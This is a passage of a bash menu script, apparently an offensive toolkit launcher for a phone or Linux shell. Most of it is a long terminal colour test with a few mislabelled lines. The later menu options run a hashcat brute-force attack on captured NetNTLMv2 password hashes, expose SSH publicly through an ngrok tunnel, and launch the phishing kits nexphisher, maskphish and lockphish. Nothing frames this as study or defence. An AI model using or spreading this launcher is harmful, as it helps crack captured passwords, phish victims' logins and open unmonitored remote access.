        tput setaf 38; echo "38colors"
        tput setaf 39; echo "39colors"
        tput setaf 40; echo "40colors"
        echo "40"
        echo ""
        tput setaf 41; echo "41colors"
        tput setaf 42; echo "42colors"
        tput setaf 43; echo "43colors"
        tput setaf 44; echo "44colors"
        tput setaf 45; echo "45colors"
        tput setaf 46; echo "46colors"
        tput setaf 47; echo "47colors"
        tput setaf 48; echo "48colors"
        tput setaf 49; echo "49colors"
        tput setaf 50; echo "50colors"
        echo "50"
        echo ""
        tput setaf 51; echo "51colors"
        tput setaf 52; echo "52colors"
        tput setaf 53; echo "53colors"
        tput setaf 54; echo "54colors"
        tput setaf 55; echo "55colors"
        tput setaf 56; echo "56colors"
        tput setaf 57; echo "57colors"
        tput setaf 58; echo "58colors"
        tput setaf 59; echo "59colors"
        tput setaf 60; echo "60colors" 
        echo "60"
        echo ""
        tput setaf 61; echo "61colors"
        tput setaf 62; echo "62colors"
        tput setaf 63; echo "63colors"
        tput setaf 64; echo "64colors"
        tput setaf 65; echo "65colors"
        tput setaf 66; echo "66colors"
        tput setaf 67; echo "67colors"
        tput setaf 68; echo "68colors"
        tput setaf 69; echo "69colors"
        tput setaf 70; echo "70colors"
        echo "70"
        echo ""
        tput setaf 71; echo "71colors"
        tput setaf 72; echo "72colors"
        tput setaf 73; echo "73colors"
        tput setaf 74; echo "74colors"
        tput setaf 75; echo "75colors"
        tput setaf 76; echo "76colors"
        tput setaf 77; echo "77colors"
        tput setaf 78; echo "78colors"
        tput setaf 79; echo "79colors"
        tput setaf 80; echo "80colors"
        echo "80"
        echo ""
        tput setaf 81; echo "81colors"
        tput setaf 82; echo "82colors"
        tput setaf 83; echo "83colors"
        tput setaf 84; echo "84colors"
        tput setaf 85; echo "85colors"
        tput setaf 86; echo "86colors"
        tput setaf 87; echo "87colors"
        tput setaf 88; echo "88colors"
        tput setaf 89; echo "89colors"
        tput setaf 90; echo "90colors"
        echo "90"
        echo ""
        tput setaf 91; echo "91colors"
        tput setaf 92; echo "93colors"
        tput setaf 93; echo "93colors"
        tput setaf 94; echo "94colors"
        tput setaf 95; echo "95colors"
        tput setaf 96; echo "96colors"
        tput setaf 97; echo "97colors"
        tput setaf 98; echo "98colors"
        tput setaf 99; echo "99colors"
        tput setaf 100; echo "100colors"
        echo "100"
        echo ""
        tput setaf 101; echo "101colors"
        tput setaf 102; echo "102colors"
        tput setaf 103; echo "103colors"
        tput setaf 104; echo "104colors"
        tput setaf 105; echo "105colors"
        tput setaf 106; echo "106colors"
        tput setaf 107; echo "107colors"
        tput setaf 108; echo "108colors"
        tput setaf 109; echo "109colors"
        tput setaf 110; echo "110colors"
        echo "110"
        echo ""
        tput setaf 111; echo "111colors"
        tput setaf 112; echo "112colors"
        tput setaf 113; echo "113colors"
        tput setaf 114; echo "114colors"
        tput setaf 115; echo "115colors"
        tput setaf 116; echo "116colors"
        tput setaf 117; echo "117colors"
        tput setaf 118; echo "118colors"
        tput setaf 119; echo "119colors"
        tput setaf 120; echo "120colors"
        echo "120"
        echo ""
        tput setaf 121; echo "121colors"
        tput setaf 122; echo "122colors"
        tput setaf 123; echo "123colors"
        tput setaf 124; echo "124colors"
        tput setaf 125; echo "125colors"
        tput setaf 126; echo "126colors"
        tput setaf 127; echo "127colors"
        tput setaf 128; echo "128colors"
        tput setaf 129; echo "129colors"
        tput setaf 130; echo "130colors"
        echo "130"
        echo ""
        tput setaf 131; echo "131colors"
        tput setaf 132; echo "132colors"
        tput setaf 133; echo "133colors"
        tput setaf 134; echo "134colors"
        tput setaf 135; echo "135colors"
        tput setaf 136; echo "136colors"
        tput setaf 137; echo "137colors"
        tput setaf 138; echo "138colors"
        tput setaf 139; echo "139colors"
        tput setaf 140; echo "140colors"
        echo "140"
        echo ""
        tput setaf 141; echo "141colors"
        tput setaf 142; echo "142colors"
        tput setaf 143; echo "143colors"
        tput setaf 144; echo "144colors"
        tput setaf 145; echo "145colors"
        tput setaf 146; echo "146colors"
        tput setaf 147; echo "147colors"
        tput setaf 148; echo "148colors"
        tput setaf 149; echo "149colors"
        tput setaf 150; echo "150colors"
        echo "150"
        echo ""
        tput setaf 151; echo "151colors"
        tput setaf 152; echo "152colors"
        tput setaf 153; echo "153colors"
        tput setaf 154; echo "154colors"
        tput setaf 155; echo "155colors"
        tput setaf 156; echo "156colors"
        tput setaf 157; echo "157colors"
        tput setaf 158; echo "158colors"
        tput setaf 159; echo "159colors"
        tput setaf 160; echo "160colors"
        echo "160"
        echo ""
        tput setaf 161; echo "161colors"
        tput setaf 162; echo "162colors"
        tput setaf 163; echo "163colors"
        tput setaf 164; echo "164colors"
        tput setaf 165; echo "165colors"
        tput setaf 166; echo "166colors"
        tput setaf 167; echo "167colors"
        tput setaf 168; echo "168colors"
        tput setaf 169; echo "169colors"
        tput setaf 170; echo "170colors"
        echo "170"
        echo ""
        tput setaf 171; echo "171colors"
        tput setaf 173; echo "172colors"
        tput setaf 173; echo "173colors"
        tput setaf 174; echo "174colors"
        tput setaf 175; echo "175colors"
        tput setaf 176; echo "176colors"
        tput setaf 177; echo "177colors"
        tput setaf 178; echo "178colors"
        tput setaf 179; echo "179colors"
        tput setaf 180; echo "180colors"
        echo "180"
        echo ""
        tput setaf 181; echo "181colors"
        tput setaf 182; echo "182colors"
        tput setaf 183; echo "183colors"
        tput setaf 184; echo "184colors"
        tput setaf 185; echo "185colors"
        tput setaf 186; echo "186colors"
        tput setaf 187; echo "187colors"
        tput setaf 188; echo "188colors"
        tput setaf 189; echo "189colors"
        tput setaf 190; echo "190colors"
        echo "190"
        echo ""
        tput setaf 191; echo "191colors"
        tput setaf 192; echo "192colors"
        tput setaf 193; echo "193colors"
        tput setaf 194; echo "194colors"
        tput setaf 195; echo "195colors"
        tput setaf 196; echo "196colors"
        tput setaf 197; echo "197colors"
        tput setaf 198; echo "198colors"
        tput setaf 199; echo "199colors"
        tput setaf 200; echo "200colors"
        echo "200"
        echo ""
        tput setaf 201; echo "201colors"
        tput setaf 202; echo "202colors"
        tput setaf 203; echo "203colors"
        tput setaf 204; echo "204colors"
        tput setaf 205; echo "205colors"
        tput setaf 206; echo "206colors"
        tput setaf 207; echo "207colors"
        tput setaf 208; echo "208colors"
        tput setaf 209; echo "209colors"
        tput setaf 210; echo "210colors"
        echo "210"
        echo ""
        tput setaf 211; echo "211colors"
        tput setaf 212; echo "212colors"
        tput setaf 213; echo "213colors"
        tput setaf 214; echo "214colors"
        tput setaf 215; echo "215colors"
        tput setaf 216; echo "216colors"
        tput setaf 217; echo "217colors"
        tput setaf 218; echo "218colors"
        tput setaf 219; echo "219colors"
        tput setaf 220; echo "220colors"
        echo "220"
        echo ""
        tput setaf 221; echo "221colors"
        tput setaf 222; echo "222colors"
        tput setaf 223; echo "223colors"
        tput setaf 224; echo "224colors"
        tput setaf 225; echo "225colors"
        tput setaf 226; echo "226colors"
        tput setaf 227; echo "227colors"
        tput setaf 228; echo "228colors"
        tput setaf 229; echo "229colors"
        tput setaf 230; echo "230colors"
        echo "230"
        echo ""
        tput setaf 231; echo "231colors"
        tput setaf 232; echo "232colors"
        tput setaf 233; echo "233colors"
        tput setaf 234; echo "234colors"
        tput setaf 235; echo "235colors"
        tput setaf 236; echo "236colors"
        tput setaf 237; echo "237colors"
        tput setaf 238; echo "238colors"
        tput setaf 239; echo "239colors"
        tput setaf 240; echo "240colors"
        echo "240"
        echo ""
        tput setaf 241; echo "241colors"
        tput setaf 242; echo "242colors"
        tput setaf 243; echo "243colors"
        tput setaf 244; echo "244colors"
        tput setaf 245; echo "245colors"
        tput setaf 246; echo "246colors"
        tput setaf 247; echo "247colors"
        tput setaf 248; echo "248colors"
        tput setaf 249; echo "249colors"
        tput setaf 250; echo "250colors"
        echo "250"
        echo ""
        tput setaf 251; echo "251colors"
        tput setaf 252; echo "252colors"
        tput setaf 253; echo "253colors"
        tput setaf 254; echo "254colors"
        tput setaf 255; echo "255colors"
        tput setaf 256; echo "256colors"
        echo "256"
      fi
      if [ $user_opt == 13 ]
      then
        clear
        echo " "
        echo $G"move all files of this type"
        echo " "
        echo "example .zip .mpg .mp3"
        echo " "
        read -p "file extention: $R" file_ex
        echo " "
        echo $G"to this location"
        echo " "
        read -p "destination: $R" user_de
        echo $G" "
        mv *$file_ex $user_de
        echo " "
        echo "done"
        sleep 3
      fi
      if [ $user_opt == 14 ]
      then
        clear
        echo " "
        echo $G"enter passwd hash file name below"
        echo " "
        read -p "file: $R" user_hash
        hashcat -m 5600 $user_hash -o cracked.txt -a 3 ?l?l?l?l?l?l?l?l
        echo " "
        echo $G"cracked file info saved tp cracked.txt"
        sleep 3
      fi
      if [ $user_opt == 15 ]
      then
        echo $G" "
        echo "disable ntp to change time and date"
        echo " "
        echo $R"1)$G ntp-off"
        echo $R"2)$G ntp-on"
        echo $R"3)$G set date"
        echo $R"4)$G set time"
        echo " "
        echo $R"x)$Y exit"
        echo $G" "
        read -n 1 -p "option: $R" user_set
        if [ $user_set == 1 ]
        then
          timedatectl set-ntp 0
        fi
        if [ $user_set == 2 ]
        then
          timedatectl set-ntp 1
        fi
        if [ $user_set == 3 ]
        then
          echo $G" "
          read -p "enter year: $R" user_yr
          echo $G" "
          read -p "enter month: $R" user_mo
          echo $G" "
          read -p "enter day: $R" user_d
          date --set $user_yr-$user_mo-$user_d
        fi
        if [ $user_set == 4 ]
        then
          echo $G"enter current time in 24 hour format. ex 21:04:13"
          read -p "time: $R" user_t
          date --set $user_t
        fi
        if [ $user_set == x ]
        then
          exit
        fi
      fi
    done
  fi
  if [ $user_intent == 9 ]
  then
    cd $HOME
    ./ngrok tcp 22
  fi
  if [ $user_intent == 0 ]
  then
    while true
    do
      echo $R"1)$G nexphisher"
      echo $R"2)$G maskphish"
      echo $R"3)$G lockphish"
      echo " "
      echo $R"x)$G exit"
      echo " "
      read -n 1 -p "opt: $R" user_phish
      if [ $user_phish == 1 ]
      then
        cd $HOME/nexphisher
        bash nexphisher
      fi
      if [ $user_phish == 2 ]
      then
        cd $HOME/maskphish
        bash maskphish.sh
      fi
      if [ $user_phish == 3 ]
      then
        cd $HOME/lockphish
        bash lockphish.sh
      fi
      if [ $user_phish == x ]
      then
        break
      fi
    done
  fi
done

